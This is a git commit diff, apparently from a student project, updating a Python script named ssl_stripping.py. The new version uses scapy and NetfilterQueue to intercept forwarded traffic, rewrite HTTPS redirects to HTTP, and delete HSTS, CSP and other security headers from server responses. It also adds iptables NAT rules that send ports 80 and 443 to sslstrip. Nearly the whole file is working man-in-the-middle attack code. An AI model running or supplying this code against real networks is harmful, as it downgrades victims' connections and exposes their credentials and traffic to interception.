8b76093186b6822ee017b85947d3fb360d4b09b9
cjgvberg <c.j.g.v.berg@student.tue.nl>
2024-06-14 13:43:49 +0200

    Add files via upload
    django's version

--- ssl_stripping.py
+++ ssl_stripping.py
@@ -1,39 +1,60 @@
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
-import multiprocessing
+from scapy.layers.http import *
+import scapy
+
+import os
+import threading
 import cryptography    #required for tls
 
-load_layer("tls")    #enables tls for the https connection with the server
-load_layer("http")    #also useful
+class SslRemover():
 
-class SslRemover(multiprocessing.Process):
-
-    def __init__(self, ip_victim, queue_num):
-        
-        multiprocessing.Process.__init__(self)
+    def __init__(self, queue_num):
 
         self.queue         = NetfilterQueue()
-        self.iprule_add    = "iptables -I FORWARD -p tcp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)
-        self.iprule_remove = "iptables -D FORWARD -p tcp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)
-        self.exit          = multiprocessing.Event()
+        self.iprule_add    = "iptables -A FORWARD -j NFQUEUE --queue-num {}".format(queue_num)
+        self.iprule_remove = "iptables -D FORWARD -j NFQUEUE --queue-num {}".format(queue_num)
+
+        self.thread        = threading.Thread(name="ssl-remover-{}".format(queue_num), target=self.queue.run)
+        self.thread.setDaemon(True)
 
         self.queue.bind(queue_num, self.handle_packet)
-
-    def handle_packet(self, packet):
-        packet_scapy = IP(packet_nfqueue.get_payload())
-
-        if packet_scapy[IP].src == ip_victim and packet_scapy[IP].dst == self.ip and packet_scapy.haslayer(HTTP):
-            
-            
-
+    
+    def handle_packet(self, packet_nfqueue):
+        """Handles each packet in the queue by parsing them and editing them."""
+        packet_scapy = IP(packet_nfqueue.get_payload()) #converts the raw packet to a scapy compatible string
         
-        packet.accept()
+        if packet_scapy.haslayer(HTTPResponse): #read the scapy string to check for HTTP responses from the server
+            if not packet_scapy[HTTPResponse].Location==None:
+                packet_scapy[HTTPResponse].Location = (packet_scapy[HTTPResponse].Location).replace("https://", "http://") #edit the redirect location to a http address instead of https
 
-    def stripped_victim_automation(self):
-        # socket = TCP_client.tcplink(HTTP, <>, 80)
+            #delete cookies that might interfere
+            del packet_scapy[HTTPResponse].Strict_Transport_Security
+            del packet_scapy[HTTPResponse].Public_Key_Pins
+            del packet_scapy[HTTPResponse].Content_Security_Policy
+            del packet_scapy[HTTPResponse].X_XSS_Protection
+            del packet_scapy[HTTPResponse].X_Frame_Options
 
+            packet_nfqueue.set_payload(bytes(packet_scapy))
+            
+        return packet_nfqueue.accept() #accept the packet and release it back into the wild
+        
+      
+    def start(self):
 
-    def tls_client_automation(self):
-        greeting = TLSClientHello(ciphers=<int code of the cipher suite>)
-        connection = TLSClientAutomaton(dport=50000, client_hello=ch)
-        connection.run()
+        os.system(self.iprule_add)
+        
+        self.thread.start()    #queue starts accepting packages
+
+        #run sslstrip by m0xie 
+        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
+        os.system("sslstrip -l 8080")
+
+    def stop(self):
+
+        os.system(self.iprule_remove)
+        os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+        os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
+
+        self.queue.unbind()    #delete queue
